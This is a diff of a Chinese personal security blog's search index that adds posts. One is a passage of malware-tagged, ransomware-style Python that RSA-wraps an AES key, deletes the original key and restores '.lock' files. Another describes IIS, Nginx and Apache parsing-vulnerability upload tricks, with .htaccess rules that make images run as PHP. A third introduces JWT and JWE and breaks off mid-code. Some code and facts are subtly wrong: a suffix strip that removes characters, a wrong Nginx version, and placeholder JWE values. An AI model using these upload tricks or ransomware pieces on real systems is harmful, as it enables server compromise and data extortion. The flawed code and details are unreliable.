class="keyword">as</span> enc_file:</span><br><span class="line">        enc_file.write(encrypted_aes_key)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;AES 密钥已使用 RSA 公钥加密并保存为 encrypted_aes_key.bin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_original_aes_key</span>():</span><br><span class="line">    <span class="comment"># 删除原始 AES 密钥文件</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.remove(<span class="string">&quot;aes_key.bin&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;原始 AES 密钥文件 aes_key.bin 已删除&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;原始 AES 密钥文件 aes_key.bin 未找到&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 读取 AES 密钥</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;aes_key.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        aes_key = f.read()</span><br><span class="line">    </span><br><span class="line">    encrypt_aes_key_with_rsa(aes_key)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 删除原始 AES 密钥文件</span></span><br><span class="line">    delete_original_aes_key()</span><br></pre></td></tr></table></figure>
+
+<h2 id="rsa公钥解密aes"><a href="#rsa公钥解密aes" class="headerlink" title="rsa公钥解密aes"></a>rsa公钥解密aes</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_aes_key_with_rsa</span>():</span><br><span class="line">    <span class="comment"># 读取 RSA 私钥</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;rsa_private_key.pem&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> priv_file:</span><br><span class="line">        priv_key_data = priv_file.read()</span><br><span class="line">        private_key = rsa.PrivateKey.load_pkcs1(priv_key_data)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 读取加密的 AES 密钥</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;encrypted_aes_key.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> enc_file:</span><br><span class="line">        encrypted_aes_key = enc_file.read()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用 RSA 私钥解密 AES 密钥</span></span><br><span class="line">    decrypted_aes_key = rsa.decrypt(encrypted_aes_key, private_key)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 打印解密后的 AES 密钥</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解密后的 AES 密钥: <span class="subst">&#123;decrypted_aes_key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将解密后的 AES 密钥保存到 decrypt_aes_key.bin 文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;decrypt_aes_key.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> aes_key_file:</span><br><span class="line">        aes_key_file.write(decrypted_aes_key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解密后的 AES 密钥已保存为 decrypt_aes_key.bin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    decrypt_aes_key_with_rsa()</span><br></pre></td></tr></table></figure>
+
+<h2 id="de-aes解密file"><a href="#de-aes解密file" class="headerlink" title="de_aes解密file"></a>de_aes解密file</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_file_with_aes</span>(<span class="params">file_path, aes_key</span>):</span><br><span class="line">    <span class="comment"># 读取加密文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> enc_file:</span><br><span class="line">        iv = enc_file.read(<span class="number">16</span>)  <span class="comment"># 获取文件前 16 字节作为 IV</span></span><br><span class="line">        encrypted_data = enc_file.read()  <span class="comment"># 获取剩余部分为加密数据</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建 AES 解密器</span></span><br><span class="line">    cipher = AES.new(aes_key, AES.MODE_CBC, iv)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 解密并去掉填充</span></span><br><span class="line">    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 获取原文件名并移除 .lock 后缀</span></span><br><span class="line">    decrypted_file_path = file_path.rstrip(<span class="string">&#x27;.lock&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 直接覆盖原文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(decrypted_file_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> dec_file:</span><br><span class="line">        dec_file.write(decrypted_data)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 删除原加密的 .lock 文件</span></span><br><span class="line">    os.remove(file_path)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 输出解密成功信息</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;文件 <span class="subst">&#123;file_path&#125;</span> 已解密为 <span class="subst">&#123;decrypted_file_path&#125;</span> 并删除原文件&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_txt_files</span>(<span class="params">aes_key</span>):</span><br><span class="line">    <span class="comment"># 遍历当前目录下的所有 .lock 文件并解密</span></span><br><span class="line">    <span class="keyword">for</span> file_name <span class="keyword">in</span> os.listdir():</span><br><span class="line">        <span class="keyword">if</span> file_name.endswith(<span class="string">&#x27;.lock&#x27;</span>):</span><br><span class="line">            decrypt_file_with_aes(file_name, aes_key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 读取解密的 AES 密钥（从 decrypt_aes_key.bin）</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;decrypt_aes_key.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        aes_key = f.read()</span><br><span class="line">    </span><br><span class="line">    decrypt_txt_files(aes_key)</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>恶意软件</tag>
       </tags>
   </entry>
   <entry>
@@ -1677,7 +1593,7 @@ GAB2 !style=harmonic![gb]4|GAB2 [K: style=harmonic]gbgb|
 C/A,/ C/C/E C/zz2|
 w:Rock-y did-nt like that</div>
 
-<h3 id="series-系列文章"><a href="#series-系列文章" class="headerlink" title="series 系列文章"></a>series 系列文章</h3><ol class="series-items"><li><a href="/posts/4a17b156.html" title="Hello World">Hello World</a></li></ol>
+<h3 id="series-系列文章"><a href="#series-系列文章" class="headerlink" title="series 系列文章"></a>series 系列文章</h3><ol class="series-items"><li><a href="/posts/4a17b156.html" title="Hello World">Hello World</a></li><li><a href="/posts/ab21860c.html" title="本站hexo魔改">本站hexo魔改</a></li></ol>
 
 
 <h1 id="code-test"><a href="#code-test" class="headerlink" title="code test"></a>code test</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    $(<span class="string">&#x27;#calendar&#x27;</span>).<span class="title function_">aCalendar</span>(<span class="string">&#x27;zh-CN&#x27;</span>);<span class="comment">//&#x27;zh-CN&#x27;请根据自己博客的语言选择</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
@@ -1712,13 +1628,146 @@ w:Rock-y did-nt like that</div>
       </tags>
   </entry>
   <entry>
+    <title>解析漏洞知识记录</title>
+    <url>/posts/64ae55e3.html</url>
+    <content><![CDATA[<h1 id="服务器文件解析漏洞原理"><a href="#服务器文件解析漏洞原理" class="headerlink" title="服务器文件解析漏洞原理"></a>服务器文件解析漏洞原理</h1><p>当Apache、IIS、Nginx等web容器在解析文件时,若网站管理员操作不当或web服务器自身的安全缺陷,导致特殊的文件被当作脚本执行</p>
+<h1 id="IIS-5-x-IIS-6"><a href="#IIS-5-x-IIS-6" class="headerlink" title="IIS 5.x&#x2F;IIS 6"></a>IIS 5.x&#x2F;IIS 6</h1><p>影响版本: IIS 5.x&#x2F;IIS 6(大多数为windows 2003)<br>开发语句为asp,无法解析aspx</p>
+<h2 id="目录解析漏洞利用"><a href="#目录解析漏洞利用" class="headerlink" title="目录解析漏洞利用:"></a>目录解析漏洞利用:</h2><p>在网站下建立文件夹的名字为*.asp、*.asa、*.cer、*.cdx 的文件夹,那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp,那么 &#x2F;test.asp&#x2F;1.jpg 将被当做asp文件来执行。</p>
+<h2 id="文件解析漏洞利用"><a href="#文件解析漏洞利用" class="headerlink" title="文件解析漏洞利用:"></a>文件解析漏洞利用:</h2><p>分号后面的不被解析，也就是说 xie.asp;.jpg 会被服务器看成是xie.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种 .asa   .cer 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 <em>.asp;.jpg、</em>.asa;.jpg、*.cer;.jpg 后缀的文件,就可以通过服务器校验,并且服务器会把它当成asp文件执行。</p>
+<h1 id="IIS-7-0-IIS-7-5-Nginx-8-03"><a href="#IIS-7-0-IIS-7-5-Nginx-8-03" class="headerlink" title="IIS 7.0&#x2F;IIS 7.5&#x2F;Nginx &lt; 8.03"></a>IIS 7.0&#x2F;IIS 7.5&#x2F;Nginx &lt; 8.03</h1><p>IIS利用条件:<br>IIS &gt; 7<br>默认开启FAST-CGI时,直接在url中图片地址后输入&#x2F;*.php会被解析为php文件<br>Nginx利用条件:<br>nginx &lt; 8.03<br>php配置文件cgi.fix_pathinfo默认开启时,当url有不存在的文件时,php向前递归解析<br>漏洞利用:<br>访问<a href="http://example.com/hack.jpg/1.php%E6%97%B6,hack.jpg%E4%BC%9A%E8%A2%AB%E5%BD%93%E4%BD%9Cphp%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C">http://example.com/hack.jpg/1.php时,hack.jpg会被当作php脚本执行</a></p>
+<h1 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h1><h2 id="文件名解析"><a href="#文件名解析" class="headerlink" title="文件名解析"></a>文件名解析</h2><p>apache自右向左解析,若遇到不可识别解析则再往左判断,如hack.php.aaa.rar,在apache中无法识别aaa和rar,则实际解析为hack.php</p>
+<h2 id="后缀识别"><a href="#后缀识别" class="headerlink" title="后缀识别"></a>后缀识别</h2><p>apache支持的后缀识别有很多:php、php3、php4、php5、phtml、pht、php3p、phps</p>
+<h2 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h2><p>.htaccess文件是Apache服务器中的一个配置文件,它负责相关目录下的网页配置。<br>该文件默认开启，启用和关闭在 httpd.conf 文件中配置。<br>条件:<br>mod_rewrite开启<br>AllowOverride All</p>
+<p>利用:<br>通过构造一个.htaccess文件并上传(前提是允许上传.htaccess文件)</p>
+<p>将所有名字里含shell的文件识别为php脚本执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch   &quot;shell&quot;&gt; </span><br><span class="line">SetHandler  application/x-httpd-php </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+<p>让.jpg后缀名文件以php脚本执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>解析漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>认识JWT</title>
+    <url>/posts/cf3c54f2.html</url>
+    <content><![CDATA[<h1 id="什么是JWT"><a href="#什么是JWT" class="headerlink" title="什么是JWT"></a>什么是JWT</h1><p>JWT(json web token)是用于系统之间发送加密签名的JSON数据的标准化格式(载荷可以是字符串或json数据)，作为身份认证、会话处理和访问控制机制的一部分<br>与传统的会话令牌不同，服务器所需要的数据存储在jwt本身的客户端</p>
+<h1 id="JWT格式"><a href="#JWT格式" class="headerlink" title="JWT格式"></a>JWT格式</h1><p>JWT由三部分组成，头部，载荷，签名，每个部分通过点连接<br>header.payload.signature</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.</span><br></pre></td></tr></table></figure>
+<p>JWT的头部和载荷部分是base64url编码的json对象，头部包含令牌本身的元数据，载荷包含用户的声明，例如上述部分解码如下：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">header<span class="punctuation">:</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;9136ddb3-cb0a-4a19-a07e-eadf5a44c8b5&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RS256&quot;</span><span class="punctuation">,</span> <span class="comment">//使用的算法</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span> <span class="comment">//令牌类型</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line">payload<span class="punctuation">:</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;iss&quot;</span><span class="punctuation">:</span> <span class="string">&quot;portswigger&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1648037164</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Carlos Montoya&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;carlos&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;role&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blog_author&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span> <span class="string">&quot;carlos@carlos-montoya.net&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1516239022</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line">signature<span class="punctuation">:</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    RSASHA256(</span><br><span class="line">    base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line">    base64UrlEncode(payload)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>正如上面部分的编码，任何有权访问jwt令牌的人都可以解码读取或修改这部分数据，因此基于jwt机制的安全性严重依赖于第三部分的加密签名</p>
+<h1 id="jwt签名"><a href="#jwt签名" class="headerlink" title="jwt签名"></a>jwt签名</h1><p>发出jwt令牌的服务器通过header和payload进行生成签名，某些情况下还会加密哈希，无论哪种方式都会涉及密钥，这种机制为服务器提供了一种验证令牌数据是否有被篡改。即：<br>签名通过header和payload产生，若前两部分遭到修改则导致签名不匹配<br>若不知道密钥，则无法为header和payload生成正确的签名</p>
+<h1 id="jwt-jws-jwe"><a href="#jwt-jws-jwe" class="headerlink" title="jwt&#x2F;jws&#x2F;jwe"></a>jwt&#x2F;jws&#x2F;jwe</h1><p>以如下json数据为例：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1234567890&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mondo&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p>JWT（JSON Web Token）<br>定义：JWT 是一种开放标准（RFC 7519），用于传输声明（Claims）和数据的安全 JSON 格式。它通常用于身份验证和授权，尤其是在单点登录（SSO）系统中<br>结构：JWT 是由三部分组成的：头部（Header）、有效载荷（Payload）和签名（Signature），在<strong>没有签名或加密</strong>的情况下，JWT 只包含未加密的数据</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;header&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;payload&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1234567890&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mondo&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;signature&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HMACSHA256(base64UrlEncode(header) + &#x27;.&#x27; + base64UrlEncode(payload), secret)&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>头部（Header）：通常会包含签名算法，如 HMAC SHA256 或 RSA<br>有效载荷（Payload）：包含声明信息{“sub”: “1234567890”, “name”: “mondo”}，可以是公开的<br>签名（Signature）：基于 header 和 payload 使用密钥签名，通常是一个秘密密钥 secret<br>由此生成的数据：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJzdWIiOiAiMTIzNDU2Nzg5MCIsICJuYW1lIjogIm1vbmRvIn0.HMACSHA256(encoded_header_and_payload<span class="punctuation">,</span> secret)</span><br></pre></td></tr></table></figure>
+<p>应用场景：JWT 通常用于 Web 服务之间的认证和授权，比如 OAuth 2.0 中的访问令牌<br>注意：JWT 是一种“令牌”格式，通常通过 Base64 编码进行传输</p>
+<h2 id="JWS"><a href="#JWS" class="headerlink" title="JWS"></a>JWS</h2><p>JWS（JSON Web Signature）<br>定义：JWS 是一种用于签名数据的标准，允许你将 JWT 数据进行签名，使其可以被验证其真实性和完整性。它是 JWT 的一种签名形式。<br>结构：JWS 也是由三部分组成：头部（Header）、有效载荷（Payload）和签名（Signature）。</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;protected&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9&quot;</span><span class="punctuation">,</span>  <span class="comment">// Base64 编码的 Header</span></span><br><span class="line">  <span class="attr">&quot;payload&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eyJzdWIiOiAiMTIzNDU2Nzg5MCIsICJuYW1lIjogIm1vbmRvIn0&quot;</span><span class="punctuation">,</span>  <span class="comment">// Base64 编码的 Payload</span></span><br><span class="line">  <span class="attr">&quot;signature&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HMACSHA256(base64UrlEncode(header) + &#x27;.&#x27; + base64UrlEncode(payload), secret)&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>头部（Header）：包含签名算法和类型信息（如 JWS）。<br>有效载荷（Payload）：这是被签名的数据，可以是任何内容（JSON 对象、字符串等）。<br>签名（Signature）：基于头部的签名算法和密钥对有效载荷进行签名，确保数据未被篡改。<br>应用场景：JWS 是一种签名机制，通常用于确保消息的完整性，防止被篡改。例如，OAuth 2.0 的 ID Token 是通过 JWS 签名的。</p>
+<h2 id="JWE"><a href="#JWE" class="headerlink" title="JWE"></a>JWE</h2><p>JWE（JSON Web Encryption）<br>格式：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">header.encrypted_key.iv.ciphertext.tag</span><br></pre></td></tr></table></figure>
+<p>定义：JWE 是一种用于加密数据的标准，它允许将 JSON 格式的数据进行加密。与 JWS 不同，JWE 主要关注数据加密而非签名。<br>结构：JWE 包含五部分：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJFUzI1NiIsImtpZCI6IkpXRUtleTFAIn0.YWN0aW9uX2tleV9jb2RlX3ZhbHVl.Rm9vQmF6.cGF5bG9hZG9jb25jdW5jdA==.c3RhY2tlZGtleQ==</span><br></pre></td></tr></table></figure>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;protected&quot;</span><span class="punctuation">:</span> <span class="string">&quot;eyJhbGciOiAiUlNBLTI1NiIsImtpZCI6ICJXc3JuaW5nQ29kZUl3In0&quot;</span><span class="punctuation">,</span>  <span class="comment">// Base64 编码的 Header</span></span><br><span class="line">  <span class="attr">&quot;encrypted_key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Y2VydC1rZXk=&quot;</span><span class="punctuation">,</span>  <span class="comment">// Base64 编码的加密密钥</span></span><br><span class="line">  <span class="attr">&quot;iv&quot;</span><span class="punctuation">:</span> <span class="string">&quot;d2luZA==&quot;</span><span class="punctuation">,</span>  <span class="comment">// Base64 编码的 IV</span></span><br><span class="line">  <span class="attr">&quot;ciphertext&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bm9uY2UgaW4gdGVzdCBkYXRh&quot;</span><span class="punctuation">,</span>  <span class="comment">// Base64 编码的加密内容</span></span><br><span class="line">  <span class="attr">&quot;tag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;U0QzNzgx&quot;</span>  <span class="comment">// Base64 编码的认证标签</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>保护头部（Header）：指示加密算法和加密类型。<br>加密密钥（Key）：用于加密内容的对称密钥。<br>初始化向量（IV）：用于加密算法的随机数据。<br>加密内容（Ciphertext）：实际加密的数据（有效载荷）。<br>认证标签（Authentication Tag）：用于验证数据完整性和防止篡改。<br>应用场景：JWE 用于保护传输中的数据不被未授权方读取，它通过加密有效载荷确保数据的机密性。适用于需要加密传输的场景。</p>
+<h3 id="JWE生成"><a href="#JWE生成" class="headerlink" title="JWE生成"></a>JWE生成</h3><p>生成AES密钥<br>使用对称密钥CEK(content encryption key)对消息内容加密，常见对称密钥是AES，通常有 AES-128、AES-192 或 AES-256</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成一个 256 位的 AES 密钥</span></span><br><span class="line">cek = get_random_bytes(<span class="number">32</span>)  <span class="comment"># 32 字节 = 256 位 AES 密钥</span></span><br></pre></td></tr></table></figure>
+<p>密钥封装<br>当CEK生成时，需要接收方的公钥加密CEK密钥，通常使用RSA对CEK加密，密钥封装算法可以是RSAES-PKCS1-v1_5、RSA-OAEP等，根据JWE的头部设置</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> PKCS1_OAEP</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载公钥 (假设 `public_key` 是接收方的公钥)</span></span><br><span class="line">rsa_key = RSA.import_key(public_key_pem)</span><br><span class="line">cipher_rsa = PKCS1_OAEP.new(rsa_key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 RSA 公钥加密 CEK</span></span><br><span class="line">encrypted_key = cipher_rsa.encrypt(cek)</span><br></pre></td></tr></table></figure>
+<p>内容加密<br>使用生成的CEK对内容进行加密</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Cryptodome.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成随机的 IV（初始化向量）</span></span><br><span class="line">iv = get_random_bytes(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 AES-GCM 加密内容</span></span><br><span class="line">cipher = AES.new(cek, AES.MODE_GCM, nonce=iv)</span><br><span class="line">ciphertext, tag = cipher.encrypt_and_digest(plaintext.encode())</span><br></pre></td></tr></table></figure>
+<p>构建JWE<br>将有关加密的部分如加密使用的密钥AES，加密的消息，加密随机向量IV等组合为一个JWE的格式</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">jwe = &#123;</span><br><span class="line">    <span class="string">&quot;protected&quot;</span>: base64.urlsafe_b64encode(<span class="string">b&#x27;&#123;&quot;alg&quot;: &quot;RSA-OAEP&quot;, &quot;enc&quot;: &quot;A256GCM&quot;&#125;&#x27;</span>).decode(),</span><br><span class="line">    <span class="string">&quot;encrypted_key&quot;</span>: base64.urlsafe_b64encode(encrypted_key).decode(),</span><br><span class="line">    <span class="string">&quot;iv&quot;</span>: base64.urlsafe_b64encode(iv).decode(),</span><br><span class="line">    <span class="string">&quot;ciphertext&quot;</span>: base64.urlsafe_b64encode(ciphertext).decode(),</span><br><span class="line">    <span class="string">&quot;tag&quot;</span>: base64.urlsafe_b64encode(tag).decode()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">jwe_str = json.dumps(jwe)</span><br></pre></td></tr></table></figure>
+<p>完整代码:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric <span class="keyword">import</span> padding <span class="keyword">as</span> asymmetric_padding</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"></span><br><span class="line"><span class="comment"># Base64 URL 编码函数（不使用 &#x27;=&#x27; 填充）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_url_encode</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.urlsafe_b64encode(data).rstrip(<span class="string">b&#x27;=&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成随机对称密钥（用于 AES 加密）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_symmetric_key</span>():</span><br><span class="line">    <span class="keyword">return</span> os.urandom(<span class="number">32</span>)  <span class="comment"># 生成 256 位密钥，用于 AES</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成初始化向量 IV</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_iv</span>():</span><br><span class="line">    <span class="keyword">return</span> os.urandom(<span class="number">12</span>)  <span class="comment"># AES GCM 模式通常使用 12 字节的 IV</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># RSA 